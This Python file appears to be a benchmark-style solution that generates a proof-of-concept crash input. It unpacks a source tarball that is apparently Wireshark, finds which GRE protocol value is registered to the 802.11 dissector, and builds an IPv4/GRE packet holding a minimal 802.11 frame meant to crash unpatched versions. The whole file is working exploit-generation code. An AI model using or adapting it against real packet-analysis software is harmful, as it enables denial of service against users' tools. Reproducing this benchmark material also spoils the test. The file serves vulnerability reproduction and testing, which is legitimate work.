import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple


def _read_text_file(path: str) -> str:
    try:
        with open(path, 'r', errors='ignore') as f:
            return f.read()
    except Exception:
        return ""


def _extract_tar(src_path: str, dst_dir: str) -> None:
    with tarfile.open(src_path, 'r:*') as tf:
        tf.extractall(dst_dir)


def _gather_files(root: str, exts=('.c', '.h')) -> list:
    files = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn.endswith(exts):
                files.append(os.path.join(dirpath, fn))
    return files


def _parse_simple_define_map(files: list) -> dict:
    # Parse simple #define MACRO VALUE lines
    # Accept hex/dec values with optional casts/parentheses and U/L suffixes.
    define_map = {}
    define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*(?:/\*.*\*/)?$', re.M)
    for path in files:
        text = _read_text_file(path)
        if not text:
            continue
        for m in define_re.finditer(text):
            name, val = m.group(1), m.group(2).strip()
            # Clean val: remove comments, trailing tokens, parentheses, casts, suffixes
            # Stop at first whitespace unless inside parentheses
            # We'll keep only a simple token like 0x..., decimal digits.
            # Handle e.g. ((guint16)0x6558U)
            val_clean = val
            # Strip inline comments
            val_clean = re.sub(r'//.*$', '', val_clean)
            val_clean = re.sub(r'/\*.*?\*/', '', val_clean)
            val_clean = val_clean.strip()
            # Remove surrounding parentheses repeatedly
            while val_clean.startswith('(') and val_clean.endswith(')'):
                val_clean = val_clean[1:-1].strip()
            # Remove casts e.g. (guint16)
            val_clean = re.sub(r'^\([^\)]+\)', '', val_clean).strip()
            # Tokenize by space or tabs or operators if it's simple
            # Retain 0x..., digits
            token = val_clean
            # Remove suffixes U, L, UL, etc
            token = re.sub(r'[uUlL]+$', '', token)
            token = token.strip()
            # Accept only simple numeric tokens (hex or decimal)
            if re.fullmatch(r'0x[0-9A-Fa-f]+', token) or re.fullmatch(r'\d+', token):
                try:
                    define_map[name] = int(token, 0)
                except Exception:
                    pass
    return define_map


def _find_gre_wlan_proto(files: list, define_map: dict) -> Optional[int]:
    # Search for dissector_add_uint("gre.proto", XXX, YYY) where YYY indicates wlan/ieee80211
    gre_add_re = re.compile(
        r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z_][A-Za-z0-9_]*|0x[0-9A-Fa-f]+|\d+)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)',
        re.S)
    # Keep candidates with heuristic priority for 802.11
    candidates: list[Tuple[int, str, str]] = []
    for path in files:
        text = _read_text_file(path)
        if not text:
            continue
        for m in gre_add_re.finditer(text):
            token, handle = m.group(1), m.group(2)
            # Parse token to int
            val = None
            if re.fullmatch(r'0x[0-9A-Fa-f]+', token) or re.fullmatch(r'\d+', token):
                try:
                    val = int(token, 0)
                except Exception:
                    val = None
            else:
                # macro
                val = define_map.get(token)
            if val is None:
                continue
            # Score the candidate by likelihood of being 802.11
            score = 0
            lower_handle = handle.lower()
            lower_path = path.lower()
            if '80211' in lower_handle or 'ieee80211' in lower_handle or 'wlan' in lower_handle:
                score += 5
            if '80211' in lower_path or 'ieee80211' in lower_path or 'wlan' in lower_path:
                score += 4
            # Additional hint: comments nearby may mention 802.11. Check preceding 200 chars.
            start = m.start()
            snippet_start = max(0, start - 200)
            snippet = text[snippet_start:start].lower()
            if '802.11' in snippet or 'ieee 802' in snippet or 'wlan' in snippet:
                score += 2
            candidates.append((score, path, val))
    if not candidates:
        return None
    # Choose candidate with highest score
    candidates.sort(key=lambda x: (x[0], -x[2]), reverse=True)
    return candidates[0][2]


def _detect_proto_value(root: str) -> Optional[int]:
    files = _gather_files(root, exts=('.c', '.h', '.cpp', '.hpp'))
    define_map = _parse_simple_define_map(files)
    # Try to prioritize files related to 802.11
    priority_files = [p for p in files if re.search(r'802|ieee80211|wlan', os.path.basename(p).lower())]
    val = _find_gre_wlan_proto(priority_files, define_map)
    if val is not None:
        return val
    # Fallback: search all files
    return _find_gre_wlan_proto(files, define_map)


def _ip_checksum(header: bytes) -> int:
    # IPv4 header checksum (16-bit one's complement of one's complement sum of all 16-bit words)
    total = 0
    n = len(header)
    i = 0
    while i < n:
        if i + 1 < n:
            word = (header[i] << 8) + header[i + 1]
        else:
            word = (header[i] << 8)
        total += word
        total = (total & 0xFFFF) + (total >> 16)
        i += 2
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def _build_ipv4_gre_packet(gre_proto: int, gre_payload: bytes, gre_flags_version: int = 0) -> bytes:
    # GRE header: Flags+Version (2 bytes, big-endian) + Protocol Type (2 bytes, big-endian)
    gre_hdr = gre_flags_version.to_bytes(2, 'big') + (gre_proto & 0xFFFF).to_bytes(2, 'big')
    gre_packet = gre_hdr + gre_payload

    # IPv4 header: 20 bytes
    version_ihl = 0x45  # Version 4, IHL 5
    dscp_ecn = 0
    total_len = 20 + len(gre_packet)
    identification = 0
    flags_frag = 0
    ttl = 64
    protocol = 47  # GRE
    hdr_checksum = 0
    src_ip = (1, 1, 1, 1)
    dst_ip = (2, 2, 2, 2)

    ip_hdr = bytearray(20)
    ip_hdr[0] = version_ihl
    ip_hdr[1] = dscp_ecn
    ip_hdr[2] = (total_len >> 8) & 0xFF
    ip_hdr[3] = total_len & 0xFF
    ip_hdr[4] = (identification >> 8) & 0xFF
    ip_hdr[5] = identification & 0xFF
    ip_hdr[6] = (flags_frag >> 8) & 0xFF
    ip_hdr[7] = flags_frag & 0xFF
    ip_hdr[8] = ttl
    ip_hdr[9] = protocol
    ip_hdr[10] = 0
    ip_hdr[11] = 0
    ip_hdr[12] = src_ip[0]
    ip_hdr[13] = src_ip[1]
    ip_hdr[14] = src_ip[2]
    ip_hdr[15] = src_ip[3]
    ip_hdr[16] = dst_ip[0]
    ip_hdr[17] = dst_ip[1]
    ip_hdr[18] = dst_ip[2]
    ip_hdr[19] = dst_ip[3]

    csum = _ip_checksum(bytes(ip_hdr))
    ip_hdr[10] = (csum >> 8) & 0xFF
    ip_hdr[11] = csum & 0xFF

    return bytes(ip_hdr) + gre_packet


def _build_minimal_80211_frame() -> bytes:
    # Minimal 802.11 management frame header (24 bytes) with zeroed addresses.
    # Frame Control (2), Duration (2), Addr1 (6), Addr2 (6), Addr3 (6), Seq Control (2)
    # Use Frame Control indicating management frame (type=0), subtype=0, no flags.
    fc = (0).to_bytes(2, 'little')
    duration = (0).to_bytes(2, 'little')
    addr1 = b'\x00' * 6
    addr2 = b'\x00' * 6
    addr3 = b'\x00' * 6
    seq_ctrl = (0).to_bytes(2, 'little')
    hdr = fc + duration + addr1 + addr2 + addr3 + seq_ctrl
    # Append a couple of bytes of body to avoid premature truncation checks
    body = b'\x00\x00\x00\x00\x00'
    return hdr + body


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            _extract_tar(src_path, tmpdir)
            proto_val = _detect_proto_value(tmpdir)
            if proto_val is None:
                # As a conservative fallback, use a likely EtherType that would have been incorrectly registered.
                # If not present, at least produce a valid GRE over IPv4 packet that won't crash fixed versions.
                proto_val = 0x6558  # Transparent Ethernet Bridging (common in GRE), harmless if fix is applied.
            # Build GRE payload: minimal 802.11 header
            wlan_payload = _build_minimal_80211_frame()
            # GRE flags+version = 0 (so subdissectors are given a small "pseudoheader" from GRE)
            packet = _build_ipv4_gre_packet(proto_val, wlan_payload, gre_flags_version=0x0000)
            return packet
        except Exception:
            # Robust fallback: still return a GRE-in-IPv4 packet to avoid empty output
            wlan_payload = _build_minimal_80211_frame()
            return _build_ipv4_gre_packet(0x6558, wlan_payload, gre_flags_version=0x0000)